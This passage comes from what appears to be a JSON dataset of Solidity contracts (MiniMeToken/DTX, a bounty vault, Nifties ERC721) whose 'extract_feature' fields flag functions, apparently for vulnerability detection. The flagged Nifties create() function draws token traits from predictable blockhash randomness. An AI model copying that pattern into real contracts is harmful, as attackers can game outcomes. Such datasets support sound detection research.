    "function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant public returns(uint) {\nbytes32 hash = sha256(this, tokenGet, amountGet, tokenGive, amountGive, expires, nonce);\nif (!(\n(orders[user][hash] || ecrecover(sha3(\"\\x19Ethereum Signed Message:\\n32\", hash),v,r,s) == user) &&\nblock.number <= expires\n)) return 0;\nuint available1 = safeSub(amountGet, orderFills[user][hash]);\nuint available2 = safeMul(tokens[tokenGive][user], amountGet) / amountGive;\nif (available1<available2) return available1;\nreturn available2;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b7b"
  },
  "filename": "3341.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n return doTransfer(msg.sender, _to, _amount);\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n if (allowed[_from][msg.sender] < _amount) return false;\n allowed[_from][msg.sender] -= _amount;\n }\n return doTransfer(_from, _to, _amount);\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal returns(bool) {\n if (_amount == 0) {\n return true;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n uint previousBalanceFrom = balanceOfAt(_from, block.number);\n if (previousBalanceFrom < _amount) {\n return false;\n }\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n uint previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract DTXToken is MiniMeToken {\n function DTXToken(address _tokenFactory) public MiniMeToken (\n _tokenFactory,\n 0x0,\n 0,\n \"DaTa eXchange Token\",\n 18,\n \"DTX\",\n true\n )\n {}\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BountyVault is Ownable {\n using SafeMath for uint256;\n DTXToken public tokenContract;\n uint256 public allocatedTotal;\n mapping(address => uint256) public balances;\n constructor(\n address _tokenAddress\n ) public {\n tokenContract = DTXToken(_tokenAddress);\n }\n function withdrawTokens() public {\n uint256 amount = balances[msg.sender];\n require(amount > 0, \"You have no tokens left\");\n balances[msg.sender] = 0;\n require(tokenContract.transfer(msg.sender, amount), \"Token transfer failed\");\n }\n function allocateTokens(address[] _recipients, uint256[] _amounts) public onlyOwner {\n for (uint256 i = 0; i < _recipients.length; i++) {\n balances[_recipients[i]] = balances[_recipients[i]].add(_amounts[i]);\n allocatedTotal = allocatedTotal.add(_amounts[i]);\n }\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b7c"
  },
  "filename": "3508.sol",
  "content": "pragma solidity ^0.4.24;\ninterface ERC165 {\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool);\n}\ncontract SupportsInterfaceWithLookup is ERC165 {\n bytes4 public constant InterfaceId_ERC165 = 0x01ffc9a7;\n mapping(bytes4 => bool) internal supportedInterfaces;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC165);\n }\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool)\n {\n return supportedInterfaces[_interfaceId];\n }\n function _registerInterface(bytes4 _interfaceId)\n internal\n {\n require(_interfaceId != 0xffffffff);\n supportedInterfaces[_interfaceId] = true;\n }\n}\ncontract ERC721Basic is ERC165 {\n bytes4 internal constant InterfaceId_ERC721 = 0x80ac58cd;\n bytes4 internal constant InterfaceId_ERC721Exists = 0x4f558e79;\n bytes4 internal constant InterfaceId_ERC721Enumerable = 0x780e9d63;\n bytes4 internal constant InterfaceId_ERC721Metadata = 0x5b5e139f;\n event Transfer(\n address indexed _from,\n address indexed _to,\n uint256 indexed _tokenId\n );\n event Approval(\n address indexed _owner,\n address indexed _approved,\n uint256 indexed _tokenId\n );\n event ApprovalForAll(\n address indexed _owner,\n address indexed _operator,\n bool _approved\n );\n function balanceOf(address _owner) public view returns (uint256 _balance);\n function ownerOf(uint256 _tokenId) public view returns (address _owner);\n function exists(uint256 _tokenId) public view returns (bool _exists);\n function approve(address _to, uint256 _tokenId) public;\n function getApproved(uint256 _tokenId)\n public view returns (address _operator);\n function setApprovalForAll(address _operator, bool _approved) public;\n function isApprovedForAll(address _owner, address _operator)\n public view returns (bool);\n function transferFrom(address _from, address _to, uint256 _tokenId) public;\n function safeTransferFrom(address _from, address _to, uint256 _tokenId)\n public;\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public;\n}\ncontract ERC721Enumerable is ERC721Basic {\n function totalSupply() public view returns (uint256);\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256 _tokenId);\n function tokenByIndex(uint256 _index) public view returns (uint256);\n}\ncontract ERC721Metadata is ERC721Basic {\n function name() external view returns (string _name);\n function symbol() external view returns (string _symbol);\n function tokenURI(uint256 _tokenId) public view returns (string);\n}\ncontract ERC721 is ERC721Basic, ERC721Enumerable, ERC721Metadata {\n}\ncontract ERC721Receiver {\n bytes4 internal constant ERC721_RECEIVED = 0x150b7a02;\n function onERC721Received(\n address _operator,\n address _from,\n uint256 _tokenId,\n bytes _data\n )\n public\n returns(bytes4);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract ERC721BasicToken is SupportsInterfaceWithLookup, ERC721Basic {\n using SafeMath for uint256;\n using AddressUtils for address;\n bytes4 private constant ERC721_RECEIVED = 0x150b7a02;\n mapping (uint256 => address) internal tokenOwner;\n mapping (uint256 => address) internal tokenApprovals;\n mapping (address => uint256) internal ownedTokensCount;\n mapping (address => mapping (address => bool)) internal operatorApprovals;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC721);\n _registerInterface(InterfaceId_ERC721Exists);\n }\n function balanceOf(address _owner) public view returns (uint256) {\n require(_owner != address(0));\n return ownedTokensCount[_owner];\n }\n function ownerOf(uint256 _tokenId) public view returns (address) {\n address owner = tokenOwner[_tokenId];\n require(owner != address(0));\n return owner;\n }\n function exists(uint256 _tokenId) public view returns (bool) {\n address owner = tokenOwner[_tokenId];\n return owner != address(0);\n }\n function approve(address _to, uint256 _tokenId) public {\n address owner = ownerOf(_tokenId);\n require(_to != owner);\n require(msg.sender == owner || isApprovedForAll(owner, msg.sender));\n tokenApprovals[_tokenId] = _to;\n emit Approval(owner, _to, _tokenId);\n }\n function getApproved(uint256 _tokenId) public view returns (address) {\n return tokenApprovals[_tokenId];\n }\n function setApprovalForAll(address _to, bool _approved) public {\n require(_to != msg.sender);\n operatorApprovals[msg.sender][_to] = _approved;\n emit ApprovalForAll(msg.sender, _to, _approved);\n }\n function isApprovedForAll(\n address _owner,\n address _operator\n )\n public\n view\n returns (bool)\n {\n return operatorApprovals[_owner][_operator];\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n require(isApprovedOrOwner(msg.sender, _tokenId));\n require(_from != address(0));\n require(_to != address(0));\n clearApproval(_from, _tokenId);\n removeTokenFrom(_from, _tokenId);\n addTokenTo(_to, _tokenId);\n emit Transfer(_from, _to, _tokenId);\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public\n {\n transferFrom(_from, _to, _tokenId);\n require(checkAndCallSafeTransfer(_from, _to, _tokenId, _data));\n }\n function isApprovedOrOwner(\n address _spender,\n uint256 _tokenId\n )\n internal\n view\n returns (bool)\n {\n address owner = ownerOf(_tokenId);\n return (\n _spender == owner ||\n getApproved(_tokenId) == _spender ||\n isApprovedForAll(owner, _spender)\n );\n }\n function _mint(address _to, uint256 _tokenId) internal {\n require(_to != address(0));\n addTokenTo(_to, _tokenId);\n emit Transfer(address(0), _to, _tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n clearApproval(_owner, _tokenId);\n removeTokenFrom(_owner, _tokenId);\n emit Transfer(_owner, address(0), _tokenId);\n }\n function clearApproval(address _owner, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _owner);\n if (tokenApprovals[_tokenId] != address(0)) {\n tokenApprovals[_tokenId] = address(0);\n }\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n require(tokenOwner[_tokenId] == address(0));\n tokenOwner[_tokenId] = _to;\n ownedTokensCount[_to] = ownedTokensCount[_to].add(1);\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _from);\n ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);\n tokenOwner[_tokenId] = address(0);\n }\n function checkAndCallSafeTransfer(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n internal\n returns (bool)\n {\n if (!_to.isContract()) {\n return true;\n }\n bytes4 retval = ERC721Receiver(_to).onERC721Received(\n msg.sender, _from, _tokenId, _data);\n return (retval == ERC721_RECEIVED);\n }\n}\ncontract ERC721Token is SupportsInterfaceWithLookup, ERC721BasicToken, ERC721 {\n string internal name_;\n string internal symbol_;\n mapping(address => uint256[]) internal ownedTokens;\n mapping(uint256 => uint256) internal ownedTokensIndex;\n uint256[] internal allTokens;\n mapping(uint256 => uint256) internal allTokensIndex;\n mapping(uint256 => string) internal tokenURIs;\n constructor(string _name, string _symbol) public {\n name_ = _name;\n symbol_ = _symbol;\n _registerInterface(InterfaceId_ERC721Enumerable);\n _registerInterface(InterfaceId_ERC721Metadata);\n }\n function name() external view returns (string) {\n return name_;\n }\n function symbol() external view returns (string) {\n return symbol_;\n }\n function tokenURI(uint256 _tokenId) public view returns (string) {\n require(exists(_tokenId));\n return tokenURIs[_tokenId];\n }\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256)\n {\n require(_index < balanceOf(_owner));\n return ownedTokens[_owner][_index];\n }\n function totalSupply() public view returns (uint256) {\n return allTokens.length;\n }\n function tokenByIndex(uint256 _index) public view returns (uint256) {\n require(_index < totalSupply());\n return allTokens[_index];\n }\n function _setTokenURI(uint256 _tokenId, string _uri) internal {\n require(exists(_tokenId));\n tokenURIs[_tokenId] = _uri;\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n super.addTokenTo(_to, _tokenId);\n uint256 length = ownedTokens[_to].length;\n ownedTokens[_to].push(_tokenId);\n ownedTokensIndex[_tokenId] = length;\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n super.removeTokenFrom(_from, _tokenId);\n uint256 tokenIndex = ownedTokensIndex[_tokenId];\n uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);\n uint256 lastToken = ownedTokens[_from][lastTokenIndex];\n ownedTokens[_from][tokenIndex] = lastToken;\n ownedTokens[_from].length--;\n ownedTokensIndex[_tokenId] = 0;\n ownedTokensIndex[lastToken] = tokenIndex;\n }\n function _mint(address _to, uint256 _tokenId) internal {\n super._mint(_to, _tokenId);\n allTokensIndex[_tokenId] = allTokens.length;\n allTokens.push(_tokenId);\n }\n function _burn(address _owner, uint256 _tokenId) internal {\n super._burn(_owner, _tokenId);\n if (bytes(tokenURIs[_tokenId]).length != 0) {\n delete tokenURIs[_tokenId];\n }\n uint256 tokenIndex = allTokensIndex[_tokenId];\n uint256 lastTokenIndex = allTokens.length.sub(1);\n uint256 lastToken = allTokens[lastTokenIndex];\n allTokens[tokenIndex] = lastToken;\n allTokens[lastTokenIndex] = 0;\n allTokens.length--;\n allTokensIndex[_tokenId] = 0;\n allTokensIndex[lastToken] = tokenIndex;\n }\n}\ncontract Nifties is ERC721Token {\n constructor() public ERC721Token(\"Nifties\",\"NIFTIES\") { }\n struct Token{\n uint8 body;\n uint8 feet;\n uint8 head;\n uint8 mouth;\n uint64 birthBlock;\n }\n Token[] private tokens;\n function create() public returns (uint256 _tokenId) {\n bytes32 sudoRandomButTotallyPredictable = keccak256(abi.encodePacked(totalSupply(),blockhash(block.number - 1)));\n uint8 body = (uint8(sudoRandomButTotallyPredictable[0])%5)+1;\n uint8 feet = (uint8(sudoRandomButTotallyPredictable[1])%7)+1;\n uint8 head = (uint8(sudoRandomButTotallyPredictable[2])%7)+1;\n uint8 mouth = (uint8(sudoRandomButTotallyPredictable[3])%8)+1;\n string memory tokenUri = createTokenUri(body,feet,head,mouth);\n Token memory _newToken = Token({\n body: body,\n feet: feet,\n head: head,\n mouth: mouth,\n birthBlock: uint64(block.number)\n });\n _tokenId = tokens.push(_newToken) - 1;\n _mint(msg.sender,_tokenId);\n _setTokenURI(_tokenId, tokenUri);\n emit Create(_tokenId,msg.sender,body,feet,head,mouth,_newToken.birthBlock,tokenUri);\n return _tokenId;\n }\n event Create(\n uint _id,\n address indexed _owner,\n uint8 _body,\n uint8 _feet,\n uint8 _head,\n uint8 _mouth,\n uint64 _birthBlock,\n string _uri\n );\n function get(uint256 _id) public view returns (address owner,uint8 body,uint8 feet,uint8 head,uint8 mouth,uint64 birthBlock) {\n return (\n tokenOwner[_id],\n tokens[_id].body,\n tokens[_id].feet,\n tokens[_id].head,\n tokens[_id].mouth,\n tokens[_id].birthBlock\n );\n }\n function tokensOfOwner(address _owner) public view returns(uint256[]) {\n return ownedTokens[_owner];\n }\n function createTokenUri(uint8 body,uint8 feet,uint8 head,uint8 mouth) internal returns (string){\n string memory uri = \"https:\n uri = appendUint8ToString(uri,body);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,feet);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,head);\n uri = strConcat(uri,\"-\");\n uri = appendUint8ToString(uri,mouth);\n uri = strConcat(uri,\".png\");\n return uri;\n }\n function appendUint8ToString(string inStr, uint8 v) internal constant returns (string str) {\n uint maxlength = 100;\n bytes memory reversed = new bytes(maxlength);\n uint i = 0;\n while (v != 0) {\n uint remainder = v % 10;\n v = v / 10;\n reversed[i++] = byte(48 + remainder);\n }\n bytes memory inStrb = bytes(inStr);\n bytes memory s = new bytes(inStrb.length + i);\n uint j;\n for (j = 0; j < inStrb.length; j++) {\n s[j] = inStrb[j];\n }\n for (j = 0; j < i; j++) {\n s[j + inStrb.length] = reversed[i - 1 - j];\n }\n str = string(s);\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n string memory ab = new string(_ba.length + _bb.length);\n bytes memory bab = bytes(ab);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) bab[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) bab[k++] = _bb[i];\n return string(bab);\n }\n}",
  "extract_feature": [
    "function create() public returns (uint256 _tokenId) {\nbytes32 sudoRandomButTotallyPredictable = keccak256(abi.encodePacked(totalSupply(),blockhash(block.number - 1)));\nuint8 body = (uint8(sudoRandomButTotallyPredictable[0])%5)+1;\nuint8 feet = (uint8(sudoRandomButTotallyPredictable[1])%7)+1;\nuint8 head = (uint8(sudoRandomButTotallyPredictable[2])%7)+1;\nuint8 mouth = (uint8(sudoRandomButTotallyPredictable[3])%8)+1;\nstring memory tokenUri = createTokenUri(body,feet,head,mouth);\nToken memory _newToken = Token({\nbody: body,\nfeet: feet,\nhead: head,\nmouth: mouth,\nbirthBlock: uint64(block.number)\n});\n_tokenId = tokens.push(_newToken) - 1;\n_mint(msg.sender,_tokenId);\n_setTokenURI(_tokenId, tokenUri);\nemit Create(_tokenId,msg.sender,body,feet,head,mouth,_newToken.birthBlock,tokenUri);\nreturn _tokenId;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b7d"
  },
  "filename": "3509.sol",
  "content": "pragma solidity ^0.4.24;\ninterface ERC165 {\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool);\n}\ncontract SupportsInterfaceWithLookup is ERC165 {\n bytes4 public constant InterfaceId_ERC165 = 0x01ffc9a7;\n mapping(bytes4 => bool) internal supportedInterfaces;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC165);\n }\n function supportsInterface(bytes4 _interfaceId)\n external\n view\n returns (bool)\n {\n return supportedInterfaces[_interfaceId];\n }\n function _registerInterface(bytes4 _interfaceId)\n internal\n {\n require(_interfaceId != 0xffffffff);\n supportedInterfaces[_interfaceId] = true;\n }\n}\ncontract ERC721Basic is ERC165 {\n bytes4 internal constant InterfaceId_ERC721 = 0x80ac58cd;\n bytes4 internal constant InterfaceId_ERC721Exists = 0x4f558e79;\n bytes4 internal constant InterfaceId_ERC721Enumerable = 0x780e9d63;\n bytes4 internal constant InterfaceId_ERC721Metadata = 0x5b5e139f;\n event Transfer(\n address indexed _from,\n address indexed _to,\n uint256 indexed _tokenId\n );\n event Approval(\n address indexed _owner,\n address indexed _approved,\n uint256 indexed _tokenId\n );\n event ApprovalForAll(\n address indexed _owner,\n address indexed _operator,\n bool _approved\n );\n function balanceOf(address _owner) public view returns (uint256 _balance);\n function ownerOf(uint256 _tokenId) public view returns (address _owner);\n function exists(uint256 _tokenId) public view returns (bool _exists);\n function approve(address _to, uint256 _tokenId) public;\n function getApproved(uint256 _tokenId)\n public view returns (address _operator);\n function setApprovalForAll(address _operator, bool _approved) public;\n function isApprovedForAll(address _owner, address _operator)\n public view returns (bool);\n function transferFrom(address _from, address _to, uint256 _tokenId) public;\n function safeTransferFrom(address _from, address _to, uint256 _tokenId)\n public;\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public;\n}\ncontract ERC721Enumerable is ERC721Basic {\n function totalSupply() public view returns (uint256);\n function tokenOfOwnerByIndex(\n address _owner,\n uint256 _index\n )\n public\n view\n returns (uint256 _tokenId);\n function tokenByIndex(uint256 _index) public view returns (uint256);\n}\ncontract ERC721Metadata is ERC721Basic {\n function name() external view returns (string _name);\n function symbol() external view returns (string _symbol);\n function tokenURI(uint256 _tokenId) public view returns (string);\n}\ncontract ERC721 is ERC721Basic, ERC721Enumerable, ERC721Metadata {\n}\ncontract ERC721Receiver {\n bytes4 internal constant ERC721_RECEIVED = 0x150b7a02;\n function onERC721Received(\n address _operator,\n address _from,\n uint256 _tokenId,\n bytes _data\n )\n public\n returns(bytes4);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract ERC721BasicToken is SupportsInterfaceWithLookup, ERC721Basic {\n using SafeMath for uint256;\n using AddressUtils for address;\n bytes4 private constant ERC721_RECEIVED = 0x150b7a02;\n mapping (uint256 => address) internal tokenOwner;\n mapping (uint256 => address) internal tokenApprovals;\n mapping (address => uint256) internal ownedTokensCount;\n mapping (address => mapping (address => bool)) internal operatorApprovals;\n constructor()\n public\n {\n _registerInterface(InterfaceId_ERC721);\n _registerInterface(InterfaceId_ERC721Exists);\n }\n function balanceOf(address _owner) public view returns (uint256) {\n require(_owner != address(0));\n return ownedTokensCount[_owner];\n }\n function ownerOf(uint256 _tokenId) public view returns (address) {\n address owner = tokenOwner[_tokenId];\n require(owner != address(0));\n return owner;\n }\n function exists(uint256 _tokenId) public view returns (bool) {\n address owner = tokenOwner[_tokenId];\n return owner != address(0);\n }\n function approve(address _to, uint256 _tokenId) public {\n address owner = ownerOf(_tokenId);\n require(_to != owner);\n require(msg.sender == owner || isApprovedForAll(owner, msg.sender));\n tokenApprovals[_tokenId] = _to;\n emit Approval(owner, _to, _tokenId);\n }\n function getApproved(uint256 _tokenId) public view returns (address) {\n return tokenApprovals[_tokenId];\n }\n function setApprovalForAll(address _to, bool _approved) public {\n require(_to != msg.sender);\n operatorApprovals[msg.sender][_to] = _approved;\n emit ApprovalForAll(msg.sender, _to, _approved);\n }\n function isApprovedForAll(\n address _owner,\n address _operator\n )\n public\n view\n returns (bool)\n {\n return operatorApprovals[_owner][_operator];\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n require(isApprovedOrOwner(msg.sender, _tokenId));\n require(_from != address(0));\n require(_to != address(0));\n clearApproval(_from, _tokenId);\n removeTokenFrom(_from, _tokenId);\n addTokenTo(_to, _tokenId);\n emit Transfer(_from, _to, _tokenId);\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId\n )\n public\n {\n safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n function safeTransferFrom(\n address _from,\n address _to,\n uint256 _tokenId,\n bytes _data\n )\n public\n {\n 